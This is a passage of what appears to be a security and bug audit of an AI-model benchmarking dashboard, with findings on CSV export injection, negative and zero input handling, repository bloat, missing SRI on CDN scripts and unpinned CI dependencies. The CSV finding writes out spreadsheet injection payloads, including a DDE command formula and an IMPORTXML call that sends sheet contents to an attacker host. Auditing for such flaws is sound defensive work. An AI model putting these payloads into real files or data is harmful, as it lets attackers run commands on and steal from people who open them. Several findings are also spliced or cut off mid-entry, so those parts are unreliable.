data/raw/{aa_models,aa_image_models,aa_local_models}.csv have 0 cells containing <>&'" (I re-measured; note aa_image_models.csv is now 151 rows, not the 148 the finder wrote — immaterial). Severity kept at medium: broad sink coverage (Rankings, Compare, Landscape, Provider leaderboard), a styled-as-first-party clickable link plus text-restyling, but it needs the third-party AA feed to carry markup in a model/provider name and cannot execute code.

title: CSV export writes unescaped scraped strings, so a crafted model name becomes a live formula in Excel/Sheets
evidence:
`export_csv` is `return _apply_filters(...).to_csv(index=False)` with no sanitisation, and docs/app.js:727-730 hands that text straight to a Blob and triggers a download named `ai_frontier_export.csv` — a filename that invites opening in a spreadsheet. Probe (poisoned _DF, run with the project venv):
  header: 'model,provider,context,quality,price,speed,latency,price_in,price_out'
  row:    "=cmd|'/c calc'!A1,@SUM(1+1)*cmd,1m,63.05,20.0,52.53..."
pandas quotes only for delimiters, so the leading `=` and `@` survive verbatim as the first characters of their cells. The same unsanitised frame is also written to data/raw/aa_models.csv by the scraper and committed hourly by .github/workflows/refresh.yml. Current committed data is clean (0 cells starting with `= + - @` across all three CSVs), so this is latent.
user_impact: An analyst clicks ↓ CSV, opens ai_frontier_export.csv in Excel, and a model named `=cmd|'/c calc'!A1` fires a DDE prompt; in Google Sheets the same cell as `=IMPORTXML("https://attacker/?"&A1, "//a")` silently exfiltrates the sheet's contents to the attacker on open. The user has no way to tell the cell was a formula — the dashboard displayed it as an ordinary model name.
suggested_fix: In `export_csv`, prefix any cell in the object-dtype columns (model, provider, context) whose first character is one of `= + - @ \\t \\r` with a single quote or a leading space before calling `to_csv`, e.g. `f[obj_cols] = f[obj_cols].map(lambda v: "'" + v if isinstance(v, str) and v[:1] in "=+-@\\t\\r" else v)`. Do the same in data/ingest.py's save path so the committed data/raw/*.csv snapshots are neutralised too.
verify_reasoning: Reproduced the exact output rather than trusting the quoted probe. Monkeypatched static_api._DF (148 rows) setting row 0 model=`=cmd|'/c calc'!A1` and provider=`@SUM(1+1)*cmd`, then called static_api.export_csv([], 0, "") (static_api.py:297-298, body is literally `return _apply_filters(...).to_csv(index=False)`). Emitted row, verbatim and unquoted: `=cmd|'/c calc'!A1,@SUM(1+1)*cmd,1m,63.05,20.0,52.5343923712054,32.0102983265,5.0,25.0` — the `=` and `@` are the first characters of their cells. Adjacent rows show pandas only quotes for embedded commas (`"Claude Opus 5 (Adaptive Reasoning, Xhigh Effort)"`), and CSV quoting does not neutralise a leading `=` in Excel/Sheets anyway. Checked for a downstream sanitiser and found none: _apply_filters does no string cleaning, and docs/app.js:723-731 takes the raw text (`callPyRaw("export_csv", ...)`) into a Blob with `a.download = "ai_frontier_export.csv"` and a synthetic click, so the file lands with a spreadsheet-inviting name. The secondary claim also holds: data/ingest.py:102-104 save_cache does a bare `df.to_csv(CACHE_PATH, index=False)` with no neutralisation, and .github/workflows/refresh.yml commits data/raw hourly. Latent today — I measured 0 cells starting with `= + - @ TAB CR` across all three committed CSVs. Medium is correct: same third-party precondition as the markup finding, but the payoff is higher (DDE prompt / IMPORTXML exfil on the analyst's machine) and the user cannot see that a displayed model name was a formula.

title: Negative token volume on the Budget tab produces negative costs and names the MOST EXPENSIVE model as "cheapest"
evidence:
docs/index.html:103 is `<input id="budget-tokens" type="number" value="1" min="0.1" step="0.1">`. `min` is a validation hint only — typing `-5` leaves `.value === "-5"` and fires `oninput`. Verified with node: `Number("-5" || 1)` => `-5`, so docs/app.js:537 passes -5 straight to Python. `_spendable` (cost_calc.py:24-25) then computes `monthly_cost = -5 * price` and sorts ASCENDING, so the largest price sorts first. Executed `./ai-frontier/bin/python -c` on static_api.update_cost_calc(-5, [], 0, "", 45):
  callout 'CHEAPEST MODEL SCORING 45+' -> 'Claude Fable 5 (Adaptive Reasoning, Max Effort, Opus 4.8 Fallback)', price/M = 40.0, monthly_cost = -200.0
  actual cheapest >=45 in the same frame -> 'DeepSeek V4 Flash 0731 (Reasoning, Max Effort)', price/M = 0.1575
  actual MOST EXPENSIVE >=45 -> 'Claude Fable 5 ...', price/M = 40.0  (i.e. the callout named the most expensive model)
  figure xaxis range -> [0, -3.882375]  (reversed axis)
  bar text labels -> ['$-200.000', '$-118.750', '$-118.750']
No guard exists in `_spendable`, `cheapest_above`, `build_cost_calc`, static_api.update_cost_calc:265-278, or app.py:1170-1174.
user_impact: A user on the public site types a negative number into MONTHLY TOKENS (a fat-finger, or pasting "-10"). The Budget tab renders a bar chart of negative dollar amounts on a reversed axis, and the headline blue callout card confidently reads "CHEAPEST MODEL SCORING 45+  ·  Claude Fable 5 ... $-200.00 / mo" — recommending the single most expensive model in the catalogue as the budget option.
suggested_fix: Clamp in one place rather than at each call site: in `_spendable`, coerce `monthly_tokens_m = max(0.0, float(monthly_tokens_m or 0))` and have `update_cost_calc` (both app.py:1170 and static_api.py:265) reject non-positive input by returning `_no_match_figure`-style explicit state ("Enter a positive token volume") instead of computing with it.
verify_reasoning: Tried to refute on two fronts and failed on both. (1) Guard hunt: read components/charts/cost_calc.py:15-47 in full — `_spendable` multiplies `monthly_tokens_m * out["price"]` and sorts ascending with no clamp; `cheapest_above` takes `ranked.iloc[0]`; static_api.py:262-278 only try/excepts `min_intelligence`, never the token count; app.py:1170-1173 is `tokens = float(monthly_tokens_m) if monthly_tokens_m else 1.0` with no lower bound. (2) Reachability: I did NOT accept the finder's `Number("-5")` argument, because programmatically assigning '-' to a type=number input triggers the value-sanitization algorithm — I reproduced that in a real browser and got value=='5', which would have refuted the finding. So I re-tested with genuine keystrokes (playwright pressSequentially('-5') on `<input type=number min=0.1 step=0.1>`) and got `{value:'-5', Number(value||1): -5, validity.rangeUnderflow: true, valid: false}` — min only flips validity, and there is no form and no validity check in docs/app.js:539, so -5 is passed straight through. Behaviour then reproduced exactly: `static_api.update_cost_calc(-5, [], 0, '', 45)` -> best = {'model':'Claude Fable 5 (Adaptive Reasoning, Max Effort, Opus 4.8 Fallback)', 'price':40.0, 'monthly_cost':-200.0}; bar text labels ['$-200.000','$-118.750','$-118.750']; xaxis range [0, -3.882375]. Independently computed the truth on the same frame: cheapest >=45 is 'DeepSeek V4 Flash 0731 (Reasoning, Max Effort)' at $0.1575, most expensive is that same Claude Fable 5 at $40.0 — the callout names the most expensive model. Severity lowered to medium only because it requires typing a negative into a token-volume box; the output when it happens is flatly wrong.

title: `value or DEFAULT` makes 0 mean "unset" in three numeric inputs, so the app answers a question the user did not ask
evidence:
Three numeric controls use Python truthiness, where 0 is falsy:
  app.py:1172 / static_api.py:268  `tokens = float(monthly_tokens_m) if monthly_tokens_m else 1.0`
  app.py:1214 / static_api.py:313  `vram_gb = float(vram_per_gpu or 8) * int(num_gpus or 1)`   (Run Local tab)
  app.py:1055 / static_api.py:400  `vram_gb = float(vram_per_gpu or 32) * int(num_gpus or 1)` (Agent Stack tab)
Executed static_api with the venv python:
  update_cost_calc(0, ...) and update_cost_calc(1, ...) produce BYTE-IDENTICAL figures; first three bars = [0.08, 0.08, 0.0875] with labels ['$0.080','$0.080','$0.087'] in both. Entering 0 silently shows the 1M-token chart.
  update_local(0, 1, 'Q4', ...) and update_local(8, ...) are identical: compat title says '21 models fit your hardware' and the scatter draws its VRAM reference line at x0 = 8.0 while the input reads 0.
  update_recommend([], 'local', 'NVIDIA RTX 5090', 0, 1, 'Q4') recommends 'Qwen3.6 35B A3B (Reasoning) ... 21.2 GB VRAM' — a 21.2 GB model for 0 GB of stated VRAM — because the Agent Stack default is 32, not 8.
The two VRAM defaults also disagree with each other (8 vs 32) for the same user action in two tabs, and disagree with docs/app.js:560 `Number(...value || 32)` / :601 `Number(...value || 32)`, so a cleared field yields 32 GB on the public site and 8 GB in Dash.
user_impact: A user clears the VRAM box or types 0 on Run Local / Agent Stack and gets a list of "models that fit your hardware" computed against 8 GB or 32 GB they never entered — including a 21.2 GB model. A user types 0 into MONTHLY TOKENS on Budget and sees a chart of non-zero dollar costs identical to the 1M-token chart. In every case the control reads 0 while the chart is drawn for a different number, with no notice.
suggested_fix: Distinguish None (unset) from 0 explicitly: `tokens = 1.0 if monthly_tokens_m is None else float(monthly_tokens_m)`, `vram = DEFAULT if vram_per_gpu is None else float(vram_per_gpu)`, and render an explicit empty state for 0. Also unify the VRAM default constant across app.py, static_api.py and docs/app.js so the same cleared field means the same thing everywhere.
verify_reasoning: Reproduced all three, and checked for upstream guards that would make the code path unreachable — none exist. `static_api.update_cost_calc(0,[],0,'',0) == static_api.update_cost_calc(1,[],0,'',0)` -> True (byte-identical JSON; first bars ['$0.080','$0.080','$0.087']). `static_api.update_local(0,1,'Q4',1792,'nvidia',None) == static_api.update_local(8,...)` -> True, compat title reads '21 models fit your hardware'. `json.loads(static_api.update_recommend([], 'local', 'NVIDIA RTX 5090', 0, 1, 'Q4'))['cards_html']` recommends 'Qwen3.6 35B A3B (Reasoning) … 21.2 GB VRAM' plus 17.7/16.4/18.1 GB entries — i.e. a 21.2 GB model for a stated 0 GB, because app.py:1055 / static_api.py:399 default to 32 while app.py:1214 / static_api.py:313 default to 8. Confirmed the two defaults do disagree by reading both lines, and that docs/app.js:560 (`local-vram … || 32`) and :598 (`recommend-vram … || 32`) both send 32, so a CLEARED local-VRAM field means 32 GB on the public site and 8 GB in Dash. Also verified in-browser that `Number('0' || 32)` is 0 (the string '0' is truthy), so a typed 0 reaches Python intact and is only then swallowed by `or 8`. Severity medium rather than high: the wrong answer is real but only appears for the deliberate 0 / cleared-field input.

title: Overview / Speed mode renders a bare white Plotly figure on the dark dashboard whenever the filter matches nothing
evidence:
`build_quadrant` returns `go.Figure()` for an empty frame — no title, no axes styling, no message, and crucially no `paper_bgcolor`, so it inherits Plotly's default LIGHT template. Executed:
  static_api.update_overview(['AI21 Labs'], 10, '', 'speed') -> traces=0, layout keys = ['template'] only
  template paper_bgcolor = 'white', plot_bgcolor = '#E5ECF6', font color '#2a3f5f'
By contrast the price mode is fine: update_overview([], 0, 'zzzz', 'price') keeps paper_bgcolor '#111111' and its title.
Reachability is not a typo case: I enumerated the two global dropdowns and found 24 of 32 providers have at least one MIN SCORE option in [10,15,...,50] that empties the frame (e.g. 'AI21 Labs'+10, 'Amazon'+25, 'Cohere'+10, 'IBM'+10). Both renderings hit it — app.py:1092 `return build_quadrant(filtered), desc` and static_api.py:225.
The caption above the chart is also not updated: app.py:1085-1089 and docs/app.js:806-809 still print "Top-right = fast and smart ... Click any bubble for full details."
user_impact: User picks a provider from the PROVIDER dropdown, sets MIN SCORE to 25, and flips the Overview X-axis to Speed. The chart card turns into a bright white/pale-blue rectangle in the middle of the black dashboard, with a caption still telling them to click a bubble. It reads as a rendering crash, and gives no hint that the filter simply matched nothing.
suggested_fix: Replace `return go.Figure()` at quadrant.py:31 with the project's own `empty_figure(...)` from components/charts/constants.py:349 (which the pareto/rankings/radar/cost_calc paths already use), e.g. `return empty_figure("No models match these filters")`, so the empty state keeps the dark canvas and explains itself.
verify_reasoning: Attacked this three ways. (a) Looked for an override that would re-skin the bare figure: grepped app.py, static_api.py, components/ and docs/ for `templates.default` — no hits; docs/app.js:442 is `Plotly.react(divId, figObj.data, figObj.layout, PLOT_CONFIG)` with no layout merge, so whatever Python emits is what renders. (b) Ran it: `json.loads(static_api.update_overview(['AI21 Labs'],10,'','speed'))` -> data == [], layout keys == ['template'] only, and template.layout paper_bgcolor == 'white', plot_bgcolor == '#E5ECF6'. The price branch is fine (`update_overview([],0,'zzzz','price')` keeps paper_bgcolor '#111111' and a full layout), so this is specific to quadrant.py:31 `return go.Figure()`. (c) Reachability — I re-measured it myself rather than trusting the finder: looping every provider in the live frame against every MIN SCORE option [10..50], 24 of 32 providers have at least one score that empties the frame (AI21 Labs+10, Amazon+25, Arcee AI+20, Celeris+15, Cohere+10, IBM+10, Inception+25, InclusionAI+40 …). The Speed toggle exists in both renderings (docs/index.html:76, app.py:316/1078) and both call build_quadrant on the filtered frame. Downgraded to medium: it is a bad, crash-looking empty state on a very reachable path, but no number shown to the user is wrong.

title: On the public site, leaving the Compare tab and returning silently replaces the user's model selection with the default five
evidence:
`switchTab` (docs/app.js:159-172) ends with `rerenderActiveFilterCharts()`, which for the compare tab calls `await refreshCompare("filter-provider")` (docs/app.js:685). title: Dash presets set a MIN SCORE that is not in the dropdown, and the Share link silently discards it
evidence:

So the float is silently dropped by the `except (ValueError, TypeError): quality = 0` at app.py:906-908. title: Committed build artifact docs/pybundle.zip is 93% of all git object storage; the hourly bot rewrites it every run
evidence: Measured, not estimated. `git count-objects -vH` => loose 190.69 MiB + pack 75.15 MiB; `du -sh .git` => 266M. I mapped every blob in `git rev-list --objects --all` to its path and summed `%(objectsize:disk)`: total blob storage 235.9 MB, of which **docs/pybundle.zip = 219.8 MB across 314 versions (93.2%)**. Next largest is FinalReport_Sarkissian.docx at 4.8 MB. 314 of the repo's 468 total commits touch the bundle. `git show --stat 9ec4064` (a routine bot commit) shows the whole binary rewritten for a CSV-sized change: `docs/pybundle.zip | Bin 4039819 -> 4039804 bytes`. Cause: refresh.yml:60 runs `build_static.py --data-only`, which calls `_swap_csvs` (build_static.py:218) to rewrite the zip in place, then line 66 `git add -- data/raw docs` commits the 4MB result. Storage cost averages 0.70 MB per committed version; 46 recent still-loose copies alone account for 170.4 MB (263/314 are deltified, and the deltified ones average only 0.18 MB, so `git gc` would reclaim a large chunk of today's 266 MB — but the structural growth continues). Rate is accelerating: bundle commits per day went 2, 2, 3, 4, 1, 2, 10, 16, 19 over Aug 3-11, and the workflow is scheduled hourly (up to 24/day).
user_impact: Anyone cloning the project pulls a 266 MB repository whose entire useful source is under 2 MB, and it grows every hour without bound. At the hourly cadence the post-gc steady state adds roughly 4 MB/day (~1.5 GB/year), so clone and CI checkout times degrade continuously and the repo drifts toward GitHub's size warnings for a file that is regenerable from source in one command.
suggested_fix: Stop committing the build artifact to the source branch. Publish docs/ with actions/deploy-pages (or a dedicated gh-pages branch built in CI) so pybundle.zip never enters main's history, and add docs/pybundle.zip to .gitignore. As an immediate mitigation run `git gc --aggressive` to compact the 170 MB of loose copies; to reclaim the historical 219.8 MB the bundle must be purged from history with git-filter-repo.
verify_reasoning:
Core mechanism reproduced independently, but the headline user-impact number is wrong.

CONFIRMED by my own measurement: I re-ran the blob-to-path mapping (`git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectsize:disk) %(rest)'` summed per path): total blob disk 217.9 MB, docs/pybundle.zip = 202.6 MB across 314 versions = 93.0%. `git rev-list --all --count -- docs/pybundle.zip` => 314; total commits 468. `git count-objects -vH` => loose 190.69 MiB, pack 75.15 MiB; `du -sh .git` => 266M. `git show --stat 9ec4064` reproduces exactly `docs/pybundle.zip | Bin 4039819 -> 4039804 bytes` for a CSV-only change. .github/workflows/refresh.yml:66 is literally `git add -- data/raw docs`, fed by line 60 `python build_static.py --data-only`, which calls rebuild_data_only -> swap_bundle_csvs (build_static.py:217, called at :243) which rewrites the whole 4 MB zip via a tmp file + `tmp.replace(bundle)`. Per-day bundle commits for Aug 3-11 came back 2,2,3,4,1,2,10,16,19 — an exact match to the finder's numbers.

WHAT I REFUTED: the user_impact sentence "Anyone cloning the project pulls a 266 MB repository." I actually performed the clone (`git clone file:///…` into scratchpad, forcing the pack protocol): the resulting .git is 44 MB (size-pack 43.16 MiB, 0 loose objects). The 266 MB is a local-only artifact of 38 still-loose pybundle blobs (I counted them by resolving each bundle blob hash to .git/objects/xx/…) that never travel over the wire. In the fresh pack, docs/pybundle.zip costs 33.80 MB across 314 versions = 0.108 MB per version, not the claimed 0.70 MB, so the steady-state projection is ~2.6 MB/day / ~0.95 GB/yr at a full 24 commits/day, not "~4 MB/day (~1.5 GB/year)" — and observed cadence peaks at 19/day, not 24. The bundle is still 77% of a real clone's pack and still grows unboundedly, so the structural finding stands; only its magnitude was inflated ~6x. Also minor: the function is `swap_bundle_csvs` (build_static.py:217), not `_swap_csvs` at :218.

Severity corrected high -> medium: no dashboard visitor is affected, a real clone is 44 MB rather than 266 MB, and the artifact is regenerable in one command; the cost falls on contributors and CI checkout only.

title: Radar renders a missing/zero latency as 0% — the worst possible score — when 0s TTFT should be the best
evidence:
radar.py:86: `l_norm = 1 - (lat / l_max) if (l_max and pd.notna(lat) and lat > 0) else 0`. The `else 0` branch fires for NaN **and for lat == 0**, so an unmeasured or zero latency is drawn at radius 0 — identical to the slowest model in the catalog — even though 0s TTFT is by definition the *best* latency. Same shape at radar.py:79 for speed and radar.py:81 for price.

Demonstrated by injecting NaN into the live frame:
  build_radar(df_with_nan, ['Kimi K2.7 Code']) -> r = [0.615, 0.0, 0.944, 0.128, 0.0]
  hovertemplate: 'Intelligence: 61% | Speed: 0% | Affordability: 94% | Context: 13% | Latency: 0%'
No visual or textual distinction from a genuinely measured worst-in-class value.

Reachability is not hypothetical. data/scraper.py:114-116 coalesces missing telemetry to zero (`speed = ts.get("median_output_speed") or 0`, `latency = ts.get("median_time_to_first_chunk") or 0`) and data/ingest.py:76-77 only drops rows on `price > 0` and `quality > 0`, never on speed/latency. Scanning the 90 archived snapshots (data/raw/history/) finds it has already happened: the 2026-02-25 snapshot contains 'GPT-5.2 (medium)' (OpenAI) and 'Jamba 1.7 Mini' (AI21 Labs) with latency = 0.0 and speed = 0.0. Had that snapshot been the live cache, GPT-5.2 would have rendered 'Latency: 0%' and 'Speed: 0%'.
user_impact: On any refresh where Artificial Analysis omits TTFT for a model, that model's Compare profile collapses on the Latency spoke to the worst value on the chart and the tooltip states 'Latency: 0%' as fact. A user comparing it against a genuinely slow model sees two identical shapes and concludes the unmeasured model is slow, when nothing was measured at all.
suggested_fix: Distinguish 'missing' from 'worst': skip the spoke (`None` in the r array, which Plotly gaps) or draw it at the population median with a dashed segment, and print '—' rather than '0%' in the hover. Separately, `lat == 0` needs to map to 1.0, not 0.0 — invert only on positive finite values and treat exact zero as best.
verify_reasoning: Tried to refute on reachability — checked whether ingest drops zero-telemetry rows before they can reach the Compare dropdown. It does not: data/ingest.py:76-77 filters only `price > 0` and `quality > 0`, and data/scraper.py:114-115 coalesces missing telemetry with `or 0`. Reproduced the render by injecting NaN into the live frame: build_radar(df, ['Kimi K2.7 Code']) returns r = [0.615, 0.119, 0.944, 0.128, 0.0] and hovertemplate 'Latency: 0%' — identical to a genuinely worst-in-class value, no gap, no marker. Injecting latency=0.0 and speed=0.0 gives [0.615, 0.0, 0.944, 0.128, 0.0]. Line citation exact (radar.py:86, with the same shape at :79 and :81). Scanned all 90 files in data/raw/history/: exactly one (aa_models_2026-02-25.csv) carries latency==0 rows — 'GPT-5.2 (medium)' (OpenAI) and 'Jamba 1.7 Mini' (AI21 Labs), both also speed==0 — so it has occurred, but the current cache has zero such rows (checked: n speed==0 = 0, n lat==0 = 0). Downgrading MEDIUM->LOW: not live today, observed in 1 of 90 snapshots affecting 2 models on one tab, and the finder's framing that '0s TTFT is by definition the best' is wrong — 0 is a missing-data sentinel from the scraper, not a measurement, so the fix is 'distinguish missing', not 'map 0 to 1.0'.

Downgrading MEDIUM->LOW: it is a layout/aesthetic defect that violates the density mandate and reads as a rendering fault, but no value shown is wrong and no user is misinformed.

title: The site and README promise hourly data; the scheduled workflow actually fires 56% of the time with observed 6-hour gaps
evidence:
README.md:3 ("updated hourly"), :8 (a green `Data-Live – hourly` shields badge), :22 ("scrapes live benchmark data ... every hour"), :73 ("the same hourly cadence"), :79 ("An hourly GitHub Actions workflow ... is the sole source of truth"). refresh.yml:4 sets `cron: "23 * * * *"`.

  199 scheduled runs across a 356.2 h window (2026-07-29T06:48Z .. 2026-08-13T03:02Z)
  198 gaps where 356 were advertised -> 56% of the promised cadence
  median gap 1.65 h, MAX gap 6.03 h, 65 gaps longer than 2 h
  minute-of-hour ranged across all of 0-59, never the :23 the cron requests
This is normal GitHub-hosted cron behaviour (scheduled runs are best-effort and dropped under load), but nothing in the pipeline accounts for it, and the freshness badge cannot expose it either because it only reports build time (see finding `freshness-badge-is-build-time-not-data-time`).

suggested_fix: Either soften the copy to what the platform actually delivers ("refreshed roughly every 1-2 hours") or make the cadence real — schedule several crons per hour (e.g. `3,23,43 * * * *`); the change guard already makes redundant runs nearly free since they exit before the rebuild. Whichever, the on-page badge should carry a threshold colour so ">3 h old" is visually distinct from "fresh".
verify_reasoning:

Median gap 1.65 h, max gap 6.03 h, 65 gaps > 2 h, minute-of-hour spread over 55 distinct values (never reliably the :23 that refresh.yml:4 requests). Since the query returns the 200 most recent runs, the window is complete — no runs are missing from it.

README copy verified verbatim: line 3 'updated hourly', line 8 the green `Data-Live – hourly` shields badge, line 22 'scrapes live benchmark data ... every hour', 'the same hourly cadence', 'An hourly GitHub Actions workflow ... is the sole source of truth'.

Severity corrected to low: the measurement is right, but the realised staleness is a 1.65 h median, and the copy overstates a best-effort GitHub cron rather than misrepresenting the data itself. Its main weight is as an aggravator of the freshness-badge finding.

title: Both CDN scripts load without SRI, and allowing cdn.jsdelivr.net in script-src defeats the CSP's stated purpose
evidence: docs/index.html:23 is `<script src="https://cdn.plot.ly/plotly-3.0.1.min.js" charset="utf-8"></script>` — version-pinned but with no `integrity`/`crossorigin`. docs/pyworker.js:13,55 do `self.importScripts("https://cdn.jsdelivr.net/pyodide/v0.27.7/full/pyodide.js")`, also unverified. The CSP at docs/index.html:18 is `script-src 'self' 'wasm-unsafe-eval' https://cdn.plot.ly https://cdn.jsdelivr.net`, and its own comment claims it is "Defence in depth behind the escaping ... if a scraped model name ever reaches the DOM as markup again, this stops it fetching or executing anything." That claim is false for script: cdn.jsdelivr.net serves arbitrary attacker-chosen npm packages. Verified: `curl -o /dev/null -w '%{http_code} %{content_type}' https://cdn.jsdelivr.net/npm/left-pad@1.3.0/index.js` -> `200 application/javascript; charset=utf-8`. So an injected `<script src="https://cdn.jsdelivr.net/npm/<attacker-package>">` passes the policy. `connect-src 'self' https://cdn.jsdelivr.net` likewise leaves a GET-path exfiltration channel open. No test in tests/ asserts SRI or the CSP contents (grep for integrity/CSP across tests/ returns only unrelated 'encoding integrity' comments).
user_impact: If cdn.plot.ly or the jsDelivr pyodide path is compromised (or DNS/BGP-hijacked for a visitor), attacker JS runs with full control of the avo-sarkissian.github.io origin — rewriting the pricing figures visitors make purchasing decisions on, and reaching any localStorage/cookies shared across that github.io subdomain. Separately, the CSP the maintainer is relying on as a second line of defence would not actually stop a script-tag injection.
suggested_fix: Add `integrity="sha384-..." crossorigin="anonymous"` to the plotly tag (plot.ly publishes the hash per release). Self-host `pyodide.js` under docs/ so `importScripts` is same-origin (importScripts cannot carry SRI), or fetch it and verify with SubtleCrypto before eval. Then drop `https://cdn.jsdelivr.net` and `https://cdn.plot.ly` from `script-src`, leaving jsdelivr only in `connect-src` for the wasm/stdlib. Add a test asserting every remote `<script>` in docs/index.html carries an integrity attribute so this cannot silently regress on the next rebuild.
verify_reasoning: Every factual claim checks out at the cited lines, but the impact narrative is partly wrong, so I am confirming the defect and cutting the severity. Verified: docs/index.html:23 is exactly `<script src="https://cdn.plot.ly/plotly-3.0.1.min.js" charset="utf-8"></script>` with no integrity/crossorigin; docs/pyworker.js:13 `const PYODIDE_INDEX = "https://cdn.jsdelivr.net/pyodide/v0.27.7/full/"` and :55 `self.importScripts(PYODIDE_INDEX + "pyodide.js")`; docs/index.html:18 CSP script-src is `'self' 'wasm-unsafe-eval' https://cdn.plot.ly https://cdn.jsdelivr.net` and the comment block at :6-16 does claim it 'stops it fetching or executing anything'; `curl -o /dev/null -w '%{http_code} %{content_type}' https://cdn.jsdelivr.net/npm/left-pad@1.3.0/index.js` -> `200 application/javascript; charset=utf-8`, so jsdelivr does serve arbitrary attacker-chosen packages under the allowed origin; `grep -rn 'integrity|Content-Security|CSP' tests/` returns only two unrelated comment lines (test_pareto_chart.py:118 'encoding integrity', test_chart_contract.py:76 'palette integrity'), so nothing pins this. What I refuted inside the finding: the user_impact's 'reaching any localStorage/cookies shared across that github.io subdomain' is false — github.io is on the Public Suffix List so no cookie can be scoped across *.github.io, and localStorage is per-origin, so avo-sarkissian.github.io shares nothing with other users' pages; and the site holds no auth, session or user data to steal. The 'CSP is defeated' escalation is also weaker than stated: it requires scraped markup to reach innerHTML, which is escaped at docs/app.js:26-29 and static_api.py:97-99/195-197, and HTML5 innerHTML does not execute injected <script> at all, while inline handlers are already blocked (no 'unsafe-inline' in script-src) and cross-origin frames/objects are blocked by `default-src 'self'` + `object-src 'none'`. What remains real is plain missing SRI on a version-pinned third-party script for a public dashboard: a cdn.plot.ly or jsDelivr compromise silently rewrites the pricing charts visitors act on. Genuine hygiene gap, no confidentiality impact — low, not medium.

title: Hourly workflow installs fully unpinned dependencies while holding a contents:write token on the branch that serves the live site
evidence: .github/workflows/refresh.yml declares `permissions: contents: write` (line 10) and the job runs `pip install -r requirements.txt` with no lockfile and no `--require-hashes`. requirements.txt is entirely range-pinned: `dash>=4.0.0`, `plotly>=6.1`, `pandas>=2.0.0`, `requests>=2.31.0`, `numpy>=1.26.0`, `gunicorn>=21.0.0`. The job then commits and pushes to main, and docs/ on main is the GitHub Pages deployment source, so anything that executes during install or scrape can rewrite the published site. Actions are floating major tags (`actions/checkout@v4`, `actions/setup-python@v5`) rather than commit SHAs. No secrets are exposed — I confirmed the AA endpoint is unauthenticated (data/scraper.py:38-41, headers are UA/Accept/Referer only) and `git log --all -p -S` for `sk-`, `ghp_`, `AKIA`, `api_key`, `apiKey`, `PRIVATE KEY`, `Bearer `, `aa_api` across all 468 commits returned only binary pybundle.zip diffs.
user_impact: A malicious release of any transitive dependency of dash/pandas/plotly (a setup.py runs at install time on some sdists) executes inside a runner that holds a token able to push to main, and its next `git push` publishes an attacker-modified docs/app.js to every visitor of the live dashboard. It reruns hourly, so the exposure window to a freshly-published bad version is under 60 minutes.
suggested_fix: Generate a hash-pinned lockfile (`pip-compile --generate-hashes` or `uv lock`) and install with `--require-hashes`; that also removes the need for the ad-hoc `pip install "plotly==6.5.2"` override on the next line. Pin `actions/checkout` and `actions/setup-python` to full commit SHAs, and enable Dependabot so the pins are still maintained.
verify_reasoning: Read .github/workflows/refresh.yml in full and could not find anything that blunts it. `permissions:` / `contents: write` are at lines 11-12 (the finder's :10 is off by two — :10 is `default: false`); the job runs `- run: pip install -r requirements.txt` followed by `- run: pip install "plotly==6.5.2"`, with no lockfile and no --require-hashes anywhere in the repo (`ls .github/workflows/` shows refresh.yml is the only workflow, so there is no separate hardened build path). requirements.txt is entirely range-pinned exactly as quoted: dash>=4.0.0, plotly>=6.1, pandas>=2.0.0, requests>=2.31.0, numpy>=1.26.0, gunicorn>=21.0.0. Actions are floating tags `actions/checkout@v4` and `actions/setup-python@v5`, not SHAs. The final step does `git config user.name github-actions[bot]`, `git add -- data/raw docs`, commit, `git pull --rebase --autostash origin main`, `git push` — so an hourly push of docs/ to main on https://github.com/Avo-Sarkissian/AI-Frontier-Database, and docs/ on main is the Pages source (no gh-pages/deploy workflow exists; the recent commit log shows the bot's `data: hourly AA refresh` commits landing directly on main). The mitigating fact the finder already noted also holds: data/scraper.py:29-41 sends only User-Agent / Accept / Referer to the unauthenticated `artificialanalysis.ai/api/data/website/host-models/performance` endpoint, so no secret is exposed to a malicious dependency — the only asset at risk is write access to the published site, and only if a transitive dep of dash/pandas/plotly ships a malicious release. Low is the right rating; keeping it.

title: app.py parses 90 history snapshots on every startup and reload, then never reads the result
evidence: AST analysis of app.py shows `history_df` in Store context at lines 44 and 81 and in **Load context nowhere** (`history_df STORE lines: [44, 81]` / `history_df LOAD lines: []`). Line 44 is module-level `history_df = load_history()`; line 81 re-runs it inside the cache-mtime reload path (docstring at line 71: 'Re-read df/history_df if the cache file has changed on disk'), so the work repeats every time the hourly refresh lands new data. Timed against real data: `load_history()` takes 85 ms and materialises 23,742 rows x 10 cols = 7.6 MB resident, by concatenating all 90 CSVs in data/raw/history (2.3 MB on disk, `ls | wc -l` = 90). The result is discarded. This is a direct consequence of the dead-module finding: the only consumers of a history frame — build_trends, build_price_timeline, build_animated_pareto — have no importers, so data/raw/history has no live consumer at all while the bot keeps growing it.
user_impact: Local Dash startup pays 85 ms and 7.6 MB for a frame that is thrown away, and repays it on every hourly data change; meanwhile the daily history archive keeps accumulating in git with nothing rendering it, so the cost is pure waste in both directions.
suggested_fix: Drop the `load_history()` calls at app.py:44 and 81 (and the `load_history` import at line 20) if the history charts are being retired; if instead the trends feature is meant to come back, wire build_trends/build_price_timeline into a tab so the loaded frame is actually used.
verify_reasoning:
Reproduced by execution and by exhaustive grep; the numbers are essentially exact.

CONFIRMED: `git grep -n 'history_df|load_history'` over app.py returns only lines 20 (import), 44 (module-level assignment), 71 (docstring), 72 (`global df, history_df, _cache_mtime`) and 81 (reassignment inside _reload_if_stale). There is no read of history_df anywhere in the file. I read app.py:38-95 directly to confirm line 81 sits inside the mtime-triggered reload path, so the cost repeats whenever data/raw/aa_models.csv changes on disk. Timed against real data with the project interpreter: load_history() => shape (23742, 10), 81.4 ms first call, 76.5 ms second (no caching), 7.23 MB deep memory — the finder's 85 ms / 23,742x10 / 7.6 MB is accurate. `ls data/raw/history | wc -l` => 90 files, 2.3 MB. data/ingest.py:114-126 confirms the function concatenates every snapshot with no cache.

ATTEMPTED REFUTATION THAT FAILED: I suspected components/charts/bump_chart.py was the live consumer, since it takes a history frame and IS imported by app.py:40. It is not — `git grep build_bump_chart` shows the symbol is imported and never called; app.py:498 calls build_value_leaders(df), which takes the current frame, not history. So the conclusion survives, though the finder's phrasing ("the only consumers of a history frame — build_trends, build_price_timeline, build_animated_pareto — have no importers") is imprecise: build_bump_chart is a fourth history consumer and it does have an importer; it is dead by never being called, not by never being imported. The archive is still being written (data/ingest.py:106-107) and committed by the bot (last touched 2026-08-11) with nothing rendering it.

